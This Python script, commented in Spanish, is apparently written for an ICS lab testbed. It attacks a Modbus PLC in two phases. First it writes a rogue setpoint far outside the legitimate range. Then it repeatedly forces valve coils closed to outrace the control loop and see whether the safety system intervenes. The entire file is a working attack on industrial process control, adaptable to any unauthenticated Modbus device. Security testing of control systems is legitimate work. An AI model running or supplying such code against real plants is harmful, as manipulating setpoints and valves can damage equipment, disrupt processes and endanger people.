#!/usr/bin/env python3
"""
Ataque 3: escritura no autorizada de setpoints/coils Modbus contra el PLC.
Objetivo: simular un ataque realista de manipulacion directa del proceso
fisico en un entorno ICS, en dos fases independientes.

Fase 1 - Setpoint no autorizado: escribe el registro 15 (setpoint) con un
valor claramente fuera del rango legitimo (300-400, ver legitimate_writes()
en scada/app.py), suplantando el rol de operador pero desde la IP del
atacante, no la de SCADA.

Fase 2 - Secuestro de valvula: escribe repetidamente el coil de la valvula
de la linea 1 (address 0) a False (cerrada), en una carrera contra el hilo
BPCS del PLC (que corrige cada ~3 segundos, ver control_logic_loop() en
modbus_server.py). Si la presion de esa linea supera el limite de
seguridad (700, ver PRESSURE_SAFETY_LIMIT en modbus_server.py), el hilo
SIS debe forzar la valvula de nuevo a abierta pese al ataque en curso.
"""
import json
import os
import sys
import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient

# --- CONFIGURACION ---
PLC_HOST = "192.168.200.3"
PLC_PORT = 5020
SLAVE_ID = 1

MANIFEST_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "recon_manifest.json")
ATTACK_LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "attack3_output.log")

FALLBACK_SETPOINT_REGISTER = 15          # mismo registro que legitimate_writes() en scada/app.py
FALLBACK_VALVE_COIL_ADDRESS = 0          # valvula de la linea 1 (linea 0 en el datastore)
FALLBACK_PRESSURE_REGISTER = 5           # hr[5] = presion de la linea 1 (ver modbus_server.py)
ROGUE_SETPOINT_VALUE = 900      # fuera del rango legitimo 300-400

ATTACK_B_DURATION_S = 90        # duracion de la fase B
ATTACK_B_WRITE_INTERVAL_S = 1.0 # mas rapido que el ciclo del BPCS (~3s) a proposito
ATTACK_B_PAUSE_BETWEEN_COILS_S = 2 #respiro entre coils en el barrido

_log_file = None

def log_message(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] [{level}] {message}"
    print(line, flush=True)
    if _log_file is not None:
        _log_file.write(line + "\n")
        _log_file.flush()
def load_targets():

    if os.path.isfile(MANIFEST_PATH):
        with open(MANIFEST_PATH) as f:
            manifest = json.load(f)
        setpoint_addr = manifest.get("best_guess_setpoint_address")
        active_coils = manifest.get("best_guess_active_coil_addresses") or []
        if setpoint_addr is not None and active_coils:
            log_message(
                f"Manifiesto de reconocimiento encontrado ({MANIFEST_PATH}). "
                f"Usando direcciones DESCUBIERTAS, sin conocimiento previo: "
                f"setpoint={setpoint_addr}, coils con actividad={active_coils}"
            )
            return setpoint_addr, active_coils, True
        log_message(
            "Manifiesto de reconocimiento encontrado pero incompleto "
            "(no se identifico setpoint y/o coil con actividad). "
            "Cayendo a direcciones conocidas de antemano.",
            "WARNING",
        )
    else:
        log_message(
            "No se encontro recon_manifest.json. MODO NO REALISTA: se van a usar "
            "direcciones conocidas de antemano (registro 15, coil 0) para poder "
            "probar el ataque rapidamente. Para una ejecucion realista, correr "
            "primero modbus_recon.py (Fase 0) y repetir esta ejecucion.",
            "WARNING",
        )
    return FALLBACK_SETPOINT_REGISTER, [FALLBACK_VALVE_COIL_ADDRESS], False

def connect():
    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT, timeout=3)
    if not client.connect():
        log_message(f"No se pudo conectar al PLC en {PLC_HOST}:{PLC_PORT}", "ERROR")
        sys.exit(1)
    return client


def attack_a_rogue_setpoint(client, setpoint_addr):
    """Fase A: escritura de un setpoint no autorizado desde la IP del atacante."""
    log_message("=== FASE A: setpoint no autorizado ===")
    log_message(
        f"Escribiendo registro {setpoint_addr} (setpoint) = {ROGUE_SETPOINT_VALUE} "
        f"(fuera del rango legitimo 300-400, y desde una IP distinta a la de SCADA)"
    )
    result = client.write_register(setpoint_addr, ROGUE_SETPOINT_VALUE, slave=SLAVE_ID)
    if result.isError():
        log_message(f"Error al escribir el setpoint: {result}", "ERROR")
    else:
        log_message("Escritura de setpoint no autorizada completada.")

    # Confirmar que el valor se aplico de verdad (el PLC no tiene ninguna
    # validacion de origen ni de rango en este punto, es justo la debilidad
    # que se esta explotando).
    time.sleep(1)
    readback = client.read_holding_registers(setpoint_addr, count=1, slave=SLAVE_ID)
    if not readback.isError():
        log_message(f"Verificacion: el PLC ahora reporta el registro{setpoint_addr} = {readback.registers[0]}")


def attack_b_hijack_coil(client, coil_addr, realistic, index, total):
    """Fase B: ataque a un coil durante 90s forzandolo repetidamente a estar apagado"""
    log_message(f"=== FASE B:({index}/{total}: secuestro del coil {coil_addr}) ===")
    log_message(
        f"Forzando el coil {coil_addr} a CERRADO cada "
        f"{ATTACK_B_WRITE_INTERVAL_S}s durante {ATTACK_B_DURATION_S}s, "
        f"para ganarle la carrera al ciclo de correccion del BPCS (~3s)."
    )
    if not realistic:
        log_message(
            f"(Modo no realista: se sabe de antemano, por el codigo fuente del PLC, "
            f"que el coil {coil_addr} es la valvula de la linea 1 y que su presion "
            f"correspondiente es el registro {FALLBACK_PRESSURE_REGISTER}. En modo "
            f"realista -- con manifiesto de reconocimiento -- no se asume esa "
            f"correspondencia exacta, ni siquiera si es una valvula o una bomba: "
            f"solo que el coil descubierto tuvo actividad de control.)"
        )

    start = time.time()
    writes = 0
    sis_trip_seen = False

    while time.time() - start < ATTACK_B_DURATION_S:
        result = client.write_coil(coil_addr, False, slave=SLAVE_ID)
        writes += 1
        if result.isError():
            log_message(f"Error al forzar el coil {coil_addr} (intento {writes}): {result}", "ERROR")

        coil_reading = client.read_coils(coil_addr, count=1, slave=SLAVE_ID)
        coil_on = None
        if not coil_reading.isError():
            coil_on = coil_reading.bits[0]
        
        if realistic:
            log_message(
                f"  coil {coil_addr}, intento {writes}: estado = "
                f"{'ACTIVO/true' if coil_on else 'inactivo/false' if coil_on is not None else 'error de lectura'}"
            )
        else:
            pressure_reading = client.read_holding_registers(FALLBACK_PRESSURE_REGISTER, count=1, slave=SLAVE_ID)
            if not pressure_reading.isError() and coil_on is not None:
                pressure = pressure_reading.registers[0] / 100
                log_message(
                    f"  intento {writes}: presion linea 1 = {pressure:.2f} bar | "
                    f"valvula {'ABIERTA' if coil_on else 'cerrada'}"
                )
            # Si el SIS ha ganado la carrera y ha vuelto a abrir la valvula
            # pese a que el atacante la sigue cerrando, la veremos abierta
            # justo despues de un write_coil(False) nuestro -- esa es la
            # senal de que el SIS ha intervenido.
        if coil_on:
            sis_trip_seen = True

        time.sleep(ATTACK_B_WRITE_INTERVAL_S)
    log_message(f"Coil {coil_addr}: {writes} escrituras forzadas en {ATTACK_B_DURATION_S}s.")
    if sis_trip_seen:
        log_message(
            f"Coil {coil_addr}: se observo ACTIVO en algun momento pese al ataque en curso -- "
            f"alguna logica de seguridad parece haber intervenido y forzado su reactivacion.",
            "SUCCESS",
        )
    else:
        log_message(
            f"Coil {coil_addr}: no se observo intervencion de ninguna logica de seguridad "
            f"durante la ventana de ataque.",
            "WARNING",
        )

    return writes, sis_trip_seen

def attack_b_sweep(client, coil_addr, realistic):

    total = len(coil_addr)
    log_message(
        f"=== FASE B: barrido de {total} coil(s) descubierto(s) con actividad, "
        f"{ATTACK_B_DURATION_S}s cada uno ==="
    )
    results={}
    for i,coil in enumerate(coil_addr, start=1):
        writes, sis_trip_seen = attack_b_hijack_coil(client, coil, realistic, i, total)
        results[coil] = {"writes": writes, "intervencion_observada": sis_trip_seen}
        if i < total:
            time.sleep(ATTACK_B_PAUSE_BETWEEN_COILS_S)
    log_message("=== RESUMEN FASE B (barrido completo) ===")
    for coil, info in results.items():
        estado = "INTERVENCION OBSERVADA" if info["intervencion_observada"] else "sin intervencion"
        log_message(f"  coil {coil}: {info['writes']} escrituras -- {estado}")
    n_intervencion = sum(1 for info in results.values() if info["intervencion_observada"])
    log_message(
        f"Total: {n_intervencion}/{total} coil(s) mostraron intervencion de alguna logica "
        f"de seguridad durante el ataque."
    )
    return results

def main():
    global _log_file
    _log_file = open(ATTACK_LOG_PATH, "w")
    try:
        log_message("########## INICIO ataque 3: escritura no autorizada Modbus ##########")
        log_message(f"Guardando log completo de esta ejecucion en: {ATTACK_LOG_PATH}")
        setpoint_addr, coil_addrs, realistic = load_targets()
        client = connect()
 
        try:
            attack_a_rogue_setpoint(client, setpoint_addr)
            time.sleep(3)
            attack_b_sweep(client, coil_addrs, realistic)
        finally:
            client.close()
 
        log_message("########## FIN ataque 3 ##########")
    finally:
        _log_file.close()


if __name__ == "__main__":
    main()